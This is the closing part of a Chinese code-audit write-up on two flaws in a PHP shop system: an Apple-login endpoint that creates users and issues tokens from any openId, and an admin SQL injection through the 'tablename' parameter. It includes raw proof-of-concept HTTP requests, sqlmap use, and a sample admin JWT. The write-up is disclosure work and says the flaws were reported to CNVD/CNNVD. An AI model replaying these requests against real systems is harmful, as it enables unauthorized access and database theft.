
### 漏洞详情

新建用户的方式有很多，其中apple快捷登陆，没有进一步确认用户身份，默认不开启强制手机号注册，导致只需要提供 openId 就能创建新用户。

### 漏洞复现

对`http://localhost:45600/api/apple_login`发起请求，修改`openId`为随机数值。

```php
POST /api/apple_login HTTP/1.1
Host: localhost:45600
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 28

{"openId":"asdasdasdqweqwe"}
```

发送请求包后即可获得Token。

![document_image_rId78.png](images/attach-42bff6d3f4942e62a9b65bdb22050f5356d28322.png)

使用 Token 即可登录账户。例如查看用户身份信息：

![document_image_rId79.png](images/attach-ff4b325e41dba66d59fc5c8b079f265560fc04fd.png)

### 漏洞审计

利用链路：

```php
api/controller/v1/LoginController.php appleLogin 444行
    services/wechat/WechatServices.php appAuth 372行
        services/wechat/WechatUserServices.php wechatOauthAfter 272行
            services/user/UserServices.php setUserInfo 122行
```

`appleLogin`函数位于`api/controller/v1/LoginController.php`第444行。从POST请求中获取4个参数，其中`phone`和`captcha`是同时使用的，允许为空。`$email`为空会自动生成，所以我们只需要传递`openId`即可。  
`openId`也可以为空，但为了随机生成新用户，需要保证`openId`的随机性。

![document_image_rId80.png](images/attach-60c5d61b57a610522defb317d06f5607b23701e1.png)

往下进入到`appAuth`函数，位于`services/wechat/WechatServices.php`第372行。这里补全了用户信息。

![document_image_rId81.png](images/attach-24e1cb53d2c825f823d7887f68ce00e3dd1809f8.png)

其中存在一个手机绑定校验，前提是开启`store_user_mobile`。这里默认值为`0`，也就无需校验手机号和验证码了。

![document_image_rId82.png](images/attach-e4b26d61fb01d72c16f726f77288c0465b8c98ce.png)

412行进入`wechatOauthAfter`函数，位于`services/wechat/WechatUserServices.php`第272行。

![document_image_rId83.png](images/attach-7225086cdd74f6fa63fbd305b741a535ac016fea.png)

这里从数据库查询了`eb_wechat_user`和`eb_user`，确保两张表都没有记录就会创建新用户。

![document_image_rId84.png](images/attach-d0b80054a01dcf915cd50445d80e0612857fd416.png)

357行进入`setUserInfo`函数，位于`services/user/UserServices.php`第122行。用于添加用户数据。

![document_image_rId85.png](images/attach-b7214fcfe3b31ddeae1b64d3407bc72f52329207.png)

【中危】后台SQL注入（查看表接口详细功能）
----------------------

### 漏洞详情

在进行SQL查询时，没有使用预编译和过滤，而是使用字符串拼接的方式拼接SQL语句。在实现查看表接口详细功能时，拼接了未经校验的数据，导致SQL注入漏洞的产生。

### 漏洞复现

*注意服务名和端口，需要自行替换*。  
访问后台：`http://localhost:45600/admin`  
输入安装时设置好的账号密码登录后台，从左侧栏进入路径`维护->开发工具->数据库管理`  
`http://localhost:45600/admin/system/maintain/system_databackup/index`

![document_image_rId86.png](images/attach-ebc2cf47af0732736cf125fe2852840aa1e78067.png)

在右边找到详细按钮，点击后并抓包，原始数据包：

![document_image_rId87.png](images/attach-7e11bb5a7d324e9d8334a0f050455e073fe9e528.png)

修改`tablename`成`'`可以看到报错提示。

![document_image_rId88.png](images/attach-e97f365f7af76033d80e63fd40da3672e3b111af.png)

保存文件后使用sqlmap进行攻击：

![document_image_rId89.png](images/attach-b3e1762b26a62f94cce04b907861cfde197472aa.png)

```php
GET /adminapi/system/backup/read?tablename=' HTTP/1.1
Host: localhost:45600
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/system/maintain/system_databackup/index
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

### 漏洞审计

在`services/system/SystemDatabackupServices.php`第68行，使用了query执行sql语句，其中`$tablename`作为字符串进行拼接，没有进行预编译或者过滤。

![document_image_rId90.png](images/attach-7f4f81f8980715cde320c162edceccb4055c2984.png)

向上寻找到`read`函数，位于`adminapi/controller/v1/system/SystemDatabackup.php`第51行，这里通过POST获取了`tablename`，虽然使用了`htmlspecialchars` ，但这个函数不过滤单引号。

![document_image_rId91.png](images/attach-2cd8b8e3bf9fa5379fd1577dfce98170a79985aa.png)

0x05 总结
=======

PHP的代码审计相对来说比较透明，关注一些危险函数即可。比较考验开发人员的安全意识和安全开发的水平能力。在实际进行代码审计时，我们需要搭建环境，结合数据库日志、代码审计工具、抓包工具进行检测。除了传统的危险函数检索，还可以从用户权限能力、业务绕过、凭据与加密方向进行考虑与审计。PHP 在CTF中的题目占较大，有非常多不错的题目，我们可以借鉴一二进行学习。

0x06 题外
=======

**漏洞报送**  
该文章涉及的漏洞已提交到CNVD、CNNVD平台。  
**文章转载**  
商业转载请联系作者获得授权，非商业转载请注明出处。  
作者公众号：响尾蛇社区
